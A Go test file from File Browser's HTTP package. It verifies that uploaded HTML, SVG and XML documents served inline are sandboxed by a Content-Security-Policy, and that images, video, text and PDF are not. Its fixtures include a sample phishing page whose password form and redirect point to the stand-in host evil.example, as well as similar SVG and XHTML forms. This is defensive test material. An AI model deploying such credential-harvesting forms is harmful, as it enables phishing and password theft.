package fbhttp

import (
	"net/http"
	"strings"
	"testing"
)

const phishingPage = `<!doctype html><html><body><form action="https://evil.example/collect">` +
	`<input name="password" type="password"><button>Sign in</button></form>` +
	`<meta http-equiv="refresh" content="0;url=https://evil.example/"></body></html>`

// A file served with ?inline=true is rendered by the browser as a page of
// this site. Scripts in it were already blocked, but forms, redirects and
// plug-ins were not: an uploaded HTML or SVG file, opened through a share
// link, could show a login form under the real File Browser address. Such
// documents are now served sandboxed, on every route that serves a file as it
// is.
func TestInlineDocumentsAreSandboxed(t *testing.T) {
	e := newFullEnv(t)
	svg := `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><form xmlns="http://www.w3.org/1999/xhtml" action="https://evil.example/"/></foreignObject></svg>`
	xml := `<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="x.xsl"?><a/>`
	documents := map[string]string{
		"page.html":   phishingPage,
		"page.HTM":    phishingPage,
		"page.xhtml":  `<html xmlns="http://www.w3.org/1999/xhtml"><body><form action="https://evil.example/"/></body></html>`,
		"image.svg":   svg,
		"data.xml":    xml,
		"sniffed":     phishingPage, // no extension: the type is taken from the content
		"sniffed.dat": phishingPage, // unknown extension: likewise
	}
	passive := map[string]string{
		"notes.txt": "plain text",
		"doc.pdf":   "%PDF-1.4 not really a pdf",
		"pic.png":   "\x89PNG\r\n\x1a\n",
		"clip.mp4":  "\x00\x00\x00\x18ftypmp42",
	}
	for name, content := range documents {
		e.writeBobFile("box/"+name, content)
	}
	for name, content := range passive {
		e.writeBobFile("box/"+name, content)
	}
	tok := e.login("bob", fullEnvUserPassword)
	share := e.createShare(tok, "/box", "{}")

	routes := map[string]struct{ prefix, token string }{
		"raw":          {"/api/raw/box/", tok},
		"public share": {"/api/public/dl/" + share + "/", ""},
	}
	sandbox := []string{"sandbox", "default-src 'none'", "img-src 'self' data:", "media-src 'self'", "style-src 'unsafe-inline'", "frame-ancestors 'self'", "script-src 'none'"}

	for route, r := range routes {
		for name := range documents {
			t.Run(route+" "+name, func(t *testing.T) {
				code, h, _ := e.do(http.MethodGet, r.prefix+name+"?inline=true", r.token, nil, nil)
				if code != http.StatusOK {
					t.Fatalf("status %d", code)
				}
				for _, directive := range sandbox {
					if !cspHas(h, directive) {
						t.Errorf("%q is missing from the policy %q (Content-Type %q)", directive, h.Values("Content-Security-Policy"), h.Get("Content-Type"))
					}
				}
				if h.Get("X-Content-Type-Options") != "nosniff" {
					t.Error("no X-Content-Type-Options: nosniff")
				}

				// Without inline the file is a download, never a page.
				_, h, _ = e.do(http.MethodGet, r.prefix+name, r.token, nil, nil)
				if !strings.HasPrefix(h.Get("Content-Disposition"), "attachment") || h.Get("Content-Type") != "application/octet-stream" {
					t.Errorf("without inline: Content-Disposition %q, Content-Type %q", h.Get("Content-Disposition"), h.Get("Content-Type"))
				}
			})
		}

		// What the interface embeds keeps working: a sandbox would stop the
		// browser's PDF viewer, and has no business on images, video or text.
		for name := range passive {
			t.Run(route+" "+name, func(t *testing.T) {
				code, h, _ := e.do(http.MethodGet, r.prefix+name+"?inline=true", r.token, nil, nil)
				if code != http.StatusOK {
					t.Fatalf("status %d", code)
				}
				if cspHas(h, "sandbox") {
					t.Errorf("%s is sandboxed (Content-Type %q)", name, h.Get("Content-Type"))
				}
				if !strings.HasPrefix(h.Get("Content-Disposition"), "inline") {
					t.Errorf("Content-Disposition = %q", h.Get("Content-Disposition"))
				}
			})
		}
	}

	// The preview route serves what it cannot resize as it is, SVG included,
	// which the interface shows in an <img>. The type has to stay an image.
	code, h, body := e.do(http.MethodGet, "/api/preview/big/box/image.svg?inline=true", tok, nil, nil)
	if code != http.StatusOK || body != svg {
		t.Fatalf("preview of the SVG = %d %q", code, body)
	}
	if !strings.HasPrefix(h.Get("Content-Type"), "image/svg+xml") {
		t.Errorf("preview of the SVG has Content-Type %q", h.Get("Content-Type"))
	}
	if !cspHas(h, "sandbox") {
		t.Errorf("preview of the SVG is not sandboxed: %q", h.Values("Content-Security-Policy"))
	}

	// The type that decided the policy is the type that is sent.
	_, h, _ = e.do(http.MethodGet, "/api/raw/box/sniffed?inline=true", tok, nil, nil)
	if !strings.HasPrefix(h.Get("Content-Type"), "text/html") {
		t.Errorf("extensionless HTML is served as %q", h.Get("Content-Type"))
	}
	_, h, body = e.do(http.MethodGet, "/api/raw/box/notes.txt?inline=true", tok, nil, map[string]string{"Range": "bytes=6-9"})
	if body != "text" || !strings.HasPrefix(h.Get("Content-Type"), "text/plain") {
		t.Errorf("range request = %q (%q)", body, h.Get("Content-Type"))
	}
}
